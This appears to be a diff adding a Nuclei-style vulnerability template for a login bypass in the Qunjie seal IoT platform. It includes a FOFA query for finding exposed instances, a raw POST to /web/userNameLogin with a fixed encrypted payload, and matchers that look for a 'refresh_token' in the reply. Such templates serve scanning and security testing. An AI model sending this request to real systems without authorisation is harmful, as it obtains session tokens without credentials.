@@ -1,0 +1,36 @@
+id: qunjie-userNameLogin-unauth
+info:
+  name: 群杰印章物联网平台存在登录绕过
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59686/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="群杰印章物联网平台"
+    tips:
+    repair:
+    version:
+  tags: qunjie,unauth
+
+http:
+  - raw:
+      - |
+        POST /web/userNameLogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.610.110 Safari/537.36
+        Content-Type: application/json
+        Content-Length: 172
+        Connection: close
+
+        {"data":"Kuc6J023uv6f02wtN5QxbmFQd4W1kl6EWndTUrJae4/UAD8yAf6Vy/j6X9c1ccQSczndbdd+pI6DR1UKVAsf7FgOwFoNu/blmhzdH2LIArOqj/Wor0Tk90gvrUARcEsPoqfCvrHEnLov4AokD80EdJ0vZT3zl6BbzSdAoYduNxQ="}
+     
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'refresh_token')
+        condition: and
